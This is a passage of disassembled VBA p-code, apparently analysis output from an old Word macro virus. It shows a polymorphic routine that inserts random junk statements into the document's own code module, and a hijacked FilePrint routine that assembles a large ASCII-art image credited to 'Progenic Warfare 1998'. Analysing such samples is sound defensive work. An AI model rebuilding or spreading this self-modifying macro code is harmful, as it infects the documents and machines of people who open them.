' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld JumpPoint 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	St Fake 
' Line #53:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' Line #54:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	St Fake 
' Line #55:
' 	LitDI2 0x0007 
' 	Case 
' 	CaseDone 
' Line #56:
' 	LitStr 0x0004 "For "
' 	Ld MorphFactor 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0009 " = 1 To 1"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 "Next "
' 	Concat 
' 	Ld MorphFactor 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Fake 
' Line #57:
' 	LitDI2 0x0008 
' 	Case 
' 	CaseDone 
' Line #58:
' 	LitStr 0x0003 "Rem"
' 	St Fake 
' Line #59:
' 	LitDI2 0x0009 
' 	Case 
' 	CaseDone 
' Line #60:
' 	LitStr 0x0003 "If "
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x002D 
' 	Mul 
' 	FnInt 
' 	Coerce (Str) 
' 	Concat 
' 	LitStr 0x0005 "Then "
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x002D 
' 	Mul 
' 	FnInt 
' 	Coerce (Str) 
' 	Concat 
' 	St Fake 
' Line #61:
' 	LitDI2 0x000A 
' 	Case 
' 	CaseDone 
' Line #62:
' 	LitStr 0x0002 "Do"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 "Exit Do"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0004 "Loop"
' 	Concat 
' 	St Fake 
' Line #63:
' 	EndSelect 
' Line #64:
' 	Ld Rnd 
' 	LitStr 0x0005 "Relax"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Mul 
' 	LitDI2 0x0003 
' 	Sub 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld Fake 
' 	LitStr 0x0005 "Relax"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	EndSub 
' Line #67:
' 	FuncDefn (Sub FilePrint())
' Line #68:
' 	OnError (Resume Next) 
' Line #69:
' 	QuoteRem 0x0000 0x0037 "Note that the pic is from Progenic Warfare [P®W] © 1998"
' Line #70:
' 	LitStr 0x0026 "                         8888  8888888"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #71:
' 	Ld Sweety 
' 	LitStr 0x002F "               8888:::8888888888888888888888888"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #72:
' 	Ld Sweety 
' 	LitStr 0x0034 "             8888::::::8888888888888888888888888888 "
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #73:
' 	Ld Sweety 
' 	LitStr 0x0035 "            88::::::::888:::8888888888888888888888888"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #74:
' 	Ld Sweety 
' 	LitStr 0x0036 "          88888888::::8:::::::::::88888888888888888888"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #75:
' 	Ld Sweety 
' 	LitStr 0x0038 "        888 8::888888::::::::::::::::::88888888888   888"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #76:
' 	Ld Sweety 
' 	LitStr 0x0038 "           88::::88888888::::m::::::::::88888888888    8"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #77:
' 	Ld Sweety 
' 	LitStr 0x0035 "         888888888888888888:M:::::::::::8888888888888"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #78:
' 	Ld Sweety 
' 	LitStr 0x0037 "        88888888888888888888::::::::::::M88888888888888"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #79:
' 	Ld Sweety 
' 	LitStr 0x0038 "        8888888888888888888888:::::::::M8888888888888888"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #80:
' 	Ld Sweety 
' 	LitStr 0x0039 "         8888888888888888888888:::::::M888888888888888888"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #81:
' 	Ld Sweety 
' 	LitStr 0x003A "        8888888888888888::88888::::::M88888888888888888888"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #82:
' 	Ld Sweety 
' 	LitStr 0x003B "      88888888888888888:::88888:::::M888888888888888   8888"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #83:
' 	Ld Sweety 
' 	LitStr 0x003B "     88888888888888888:::88888::::M::;o*M*o;888888888    88"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #84:
' 	Ld Sweety 
' 	LitStr 0x003A "    88888888888888888:::8888:::::M:::::::::::88888888    8"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #85:
' 	Ld Sweety 
' 	LitStr 0x0037 "   88888888888888888::::88::::::M:;:::::::::::888888888"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #86:
' 	Ld Sweety 
' 	LitStr 0x0040 "  8888888888888888888:::8::::::M::aAa::::::::M8888888888       8"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #87:
' 	Ld Sweety 
' 	LitStr 0x0040 "  88   8888888888::88::::8::::M:::::::::::::888888888888888 8888"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #88:
' 	Ld Sweety 
' 	LitStr 0x003F " 88  88888888888:::8:::::::::M::::::::::;::88:88888888888888888"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #89:
' 	Ld Sweety 
' 	LitStr 0x003E " 8  8888888888888:::::::::::M::²@@@@@@@²::::8w8888888888888888"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #90:
' 	Ld Sweety 
' 	LitStr 0x003D "  88888888888:888::::::::::M:::::³@a@³:::::M8i888888888888888"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #91:
' 	Ld Sweety 
' 	LitStr 0x003F " 8888888888::::88:::::::::M88:::::::::::::M88z88888888888888888"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #92:
' 	Ld Sweety 
' 	LitStr 0x0040 "8888888888:::::8:::::::::M88888:::::::::MM888!888888888888888888"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #93:
' 	Ld Sweety 
' 	LitStr 0x0041 "888888888:::::8:::::::::M8888888MAmmmAMVMM888*88888888   88888888"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #94:
' 	Ld Sweety 
' 	LitStr 0x0042 "888888 M:::::::::::::::M888888888:::::::MM88888888888888   8888888"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #95:
' 	Ld Sweety 
' 	LitStr 0x0042 "8888   M::::::::::::::M88888888888::::::MM888888888888888    88888"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #96:
' 	Ld Sweety 
' 	LitStr 0x0042 " 888   M:::::::::::::M8888888888888M:::::mM888888888888888    8888"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #97:
' 	Ld Sweety 
' 	LitStr 0x0042 "  888  M::::::::::::M8888:888888888888::::m::Mm88888 888888   8888"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #98:
' 	Ld Sweety 
' 	LitStr 0x0041 "   88  M::::::::::::8888:88888888888888888::::::Mm8   88888   888"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #99:
' 	Ld Sweety 
' 	LitStr 0x0040 "   88  M::::::::::8888M::88888::888888888888:::::::Mm88888    88"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #100:
' 	Ld Sweety 
' 	LitStr 0x003F "   8   MM::::::::8888M:::8888:::::888888888888::::::::Mm8     4"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #101:
' 	Ld Sweety 
' 	LitStr 0x003F "       8M:::::::8888M:::::888:::::::88:::8888888::::::::Mm    2"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #102:
' 	Ld Sweety 
' 	LitStr 0x003B "      88MM:::::8888M:::::::88::::::::8:::::888888:::M:::::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #103:
' 	Ld Sweety 
' 	LitStr 0x003B "     8888M:::::888MM::::::::8:::::::::::M::::8888::::M::::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #104:
' 	Ld Sweety 
' 	LitStr 0x003B "    88888M:::::88:M::::::::::8:::::::::::M:::8888::::::M::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #105:
' 	Ld Sweety 
' 	LitStr 0x003B "   88 888MM:::888:M:::::::::::::::::::::::M:8888:::::::::M:"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #106:
' 	Ld Sweety 
' 	LitStr 0x003C "   8 88888M:::88::M:::::::::::::::::::::::MM:88::::::::::::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #107:
' 	Ld Sweety 
' 	LitStr 0x003E "     88888M:::88::M::::::::::*88*::::::::::M:88::::::::::::::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #108:
' 	Ld Sweety 
' 	LitStr 0x003F "    888888M:::88::M:::::::::88@@88:::::::::M::88::::::::::::::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #109:
' 	Ld Sweety 
' 	LitStr 0x0040 "    888888MM::88::MM::::::::88@@88:::::::::M:::8::::::::::::::*8"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #110:
' 	Ld Sweety 
' 	LitStr 0x0041 "    88888  M:::8::MM:::::::::*88*::::::::::M:::::::::::::::::88@@"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #111:
' 	Ld Sweety 
' 	LitStr 0x0041 "    8888   MM::::::MM:::::::::::::::::::::MM:::::::::::::::::88@@"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #112:
' 	Ld Sweety 
' 	LitStr 0x0040 "     888    M:::::::MM:::::::::::::::::::MM::M::::::::::::::::*8"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #113:
' 	Ld Sweety 
' 	LitStr 0x003F "     888    MM:::::::MMM::::::::::::::::MM:::MM:::::::::::::::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #114:
' 	Ld Sweety 
' 	LitStr 0x003E "      88     M::::::::MMMM:::::::::::MMMM:::::MM::::::::::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #115:
' 	Ld Sweety 
' 	LitStr 0x003D "       88    MM:::::::::MMMMMMMMMMMMMMM::::::::MMM::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #116:
' 	Ld Sweety 
' 	LitStr 0x003B "        88    MM::::::::::::MMMMMMM::::::::::::::MMMMMMMMMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #117:
' 	Ld Sweety 
' 	LitStr 0x0039 "         88   8MM::::::::::::::::::::::::::::::::::MMMMMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #118:
' 	Ld Sweety 
' 	LitStr 0x0037 "          8   88MM::::::::::::::::::::::M:::M::::::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #119:
' 	Ld Sweety 
' 	LitStr 0x0037 "              888MM::::::::::::::::::MM::::::MM::::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #120:
' 	Ld Sweety 
' 	LitStr 0x0036 "             88888MM:::::::::::::::MMM:::::::mM:::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #121:
' 	Ld Sweety 
' 	LitStr 0x0035 "             888888MM:::::::::::::MMM:::::::::MMM:::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #122:
' 	Ld Sweety 
' 	LitStr 0x0035 "            88888888MM:::::::::::MMM:::::::::::MM:::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #123:
' 	Ld Sweety 
' 	LitStr 0x0035 "           88 8888888M:::::::::MMM::::::::::::::M:::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #124:
' 	Ld Sweety 
' 	LitStr 0x0036 "           8  888888 M:::::::MM:::::::::::::::::M:::M:"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #125:
' 	Ld Sweety 
' 	LitStr 0x0036 "              888888 M::::::M:::::::::::::::::::M:::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #126:
' 	Ld Sweety 
' 	LitStr 0x0037 "             888888  M:::::M::::::::::::::::::::::::M:M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #127:
' 	Ld Sweety 
' 	LitStr 0x0038 "             888888  M:::::M:::::::::@::::::::::::::M::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #128:
' 	Ld Sweety 
' 	LitStr 0x0039 "             88888   M::::::::::::::@@:::::::::::::::M::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #129:
' 	Ld Sweety 
' 	LitStr 0x003A "            88888   M::::::::::::::@@@::::::::::::::::M::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #130:
' 	Ld Sweety 
' 	LitStr 0x003B "           88888   M:::::::::::::::@@::::::::::::::::::M::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #131:
' 	Ld Sweety 
' 	LitStr 0x003C "          88888   M:::::m::::::::::@::::::::::Mm:::::::M:::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #132:
' 	Ld Sweety 
' 	LitStr 0x003D "          8888   M:::::M:::::::::::::::::::::::MM:::::::M:::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #133:
' 	Ld Sweety 
' 	LitStr 0x003E "         8888   M:::::M:::::::::::::::::::::::MMM::::::::M:::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #134:
' 	Ld Sweety 
' 	LitStr 0x003F "        888    M:::::Mm::::::::::::::::::::::MMM:::::::::M::::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #135:
' 	Ld Sweety 
' 	LitStr 0x0040 "      8888    MM::::Mm:::::::::::::::::::::MMMM:::::::::m::m:::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #136:
' 	Ld Sweety 
' 	LitStr 0x0041 "     888      M:::::M::::::::::::::::::::MMM::::::::::::M::mm:::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #137:
' 	Ld Sweety 
' 	LitStr 0x0042 "  8888       MM:::::::::::::::::::::::::MM:::::::::::::mM::MM:::M:"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #138:
' 	Ld Sweety 
' 	LitStr 0x0042 "             M:::::::::::::::::::::::::M:::::::::::::::mM::MM:::Mm"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #139:
' 	Ld Sweety 
' 	LitStr 0x0042 "            MM::::::m:::::::::::::::::::::::::::::::::::M::MM:::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #140:
' 	Ld Sweety 
' 	LitStr 0x0042 "            M::::::::M:::::::::::::::::::::::::::::::::::M::M:::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #141:
' 	Ld Sweety 
' 	LitStr 0x0042 "           MM:::::::::M:::::::::::::M:::::::::::::::::::::M:M:::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #142:
' 	Ld Sweety 
' 	LitStr 0x0042 "           M:::::::::::M88:::::::::M:::::::::::::::::::::::MM::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #143:
' 	Ld Sweety 
' 	LitStr 0x0041 "           M::::::::::::8888888888M::::::::::::::::::::::::MM::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #144:
' 	Ld Sweety 
' 	LitStr 0x0040 "           M:::::::::::::88888888M:::::::::::::::::::::::::M::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #145:
' 	Ld Sweety 
' 	LitStr 0x003F "           M::::::::::::::888888M:::::::::::::::::::::::::M::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #146:
' 	Ld Sweety 
' 	LitStr 0x003E "           M:::::::::::::::88888M:::::::::::::::::::::::::M:MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #147:
' 	Ld Sweety 
' 	LitStr 0x003D "           M:::::::::::::::::88M::::::::::::::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #148:
' 	Ld Sweety 
' 	LitStr 0x003D "           M:::::::::::::::::::M::::::::::::::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #149:
' 	Ld Sweety 
' 	LitStr 0x003C "           MM:::::::::::::::::M::::::::::::::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #150:
' 	Ld Sweety 
' 	LitStr 0x003C "            M:::::::::::::::::M::::::::::::::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #151:
' 	Ld Sweety 
' 	LitStr 0x003B "            MM:::::::::::::::M::::::::::::::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #152:
' 	Ld Sweety 
' 	LitStr 0x003A "             M:::::::::::::::M:::::::::::::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #153:
' 	Ld Sweety 
' 	LitStr 0x0039 "             MM:::::::::::::M:::::::::::::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #154:
' 	Ld Sweety 
' 	LitStr 0x0038 "              M:::::::::::::M::::::::::::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #155:
' 	Ld Sweety 
' 	LitStr 0x0037 "              MM:::::::::::M::::::::::::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #156:
' 	Ld Sweety 
' 	LitStr 0x0036 "               M:::::::::::M:::::::::::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #157:
' 	Ld Sweety 
' 	LitStr 0x0035 "               MM:::::::::M:::::::::::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #158:
' 	Ld Sweety 
' 	LitStr 0x0034 "                M:::::::::M::::::::::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #159:
' 	Ld Sweety 
' 	LitStr 0x0033 "                MM:::::::M::::::::::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #160:
' 	Ld Sweety 
' 	LitStr 0x0032 "                 MM::::::M:::::::::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #161:
' 	Ld Sweety 
' 	LitStr 0x0031 "                 MM:::::M:::::::::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #162:
' 	Ld Sweety 
' 	LitStr 0x0030 "                  MM::::M::::::::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #163:
' 	Ld Sweety 
' 	LitStr 0x002F "                  MM:::M::::::::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #164:
' 	Ld Sweety 
' 	LitStr 0x002E "                   MM::M:::::::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #165:
' 	Ld Sweety 
' 	LitStr 0x002D "                   MM:M:::::::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #166:
' 	Ld Sweety 
' 	LitStr 0x002C "                    MMM::::::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #167:
' 	Ld Sweety 
' 	LitStr 0x002B "                    MM::::::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #168:
' 	Ld Sweety 
' 	LitStr 0x002A "                     M:::::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #169:
' 	Ld Sweety 
' 	LitStr 0x0029 "                    MM::::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #170:
' 	Ld Sweety 
' 	LitStr 0x0028 "                    MM:::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #171:
' 	Ld Sweety 
' 	LitStr 0x0028 "                    mMM::::MM:::::::MMMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #172:
' 	Ld Sweety 
' 	LitStr 0x0028 "                     mMM:::M:::::::M:M:M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #173:
' 	Ld Sweety 
' 	LitStr 0x0028 "                      MM::MMM::::::::M:M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #174:
' 	Ld Sweety 
' 	LitStr 0x0029 "                       MM::MM:::::::::M:M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #175:
' 	Ld Sweety 
' 	LitStr 0x002A "                       MM::MM::::::::::M:m"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #176:
' 	Ld Sweety 
' 	LitStr 0x002A "                       MM:::M:::::::::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #177:
' 	Ld Sweety 
' 	LitStr 0x002B "                       MMM:::::::::::::::M:"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #178:
' 	Ld Sweety 
' 	LitStr 0x002B "                       MMM:::::::::::::::M:"
' 	Concat 
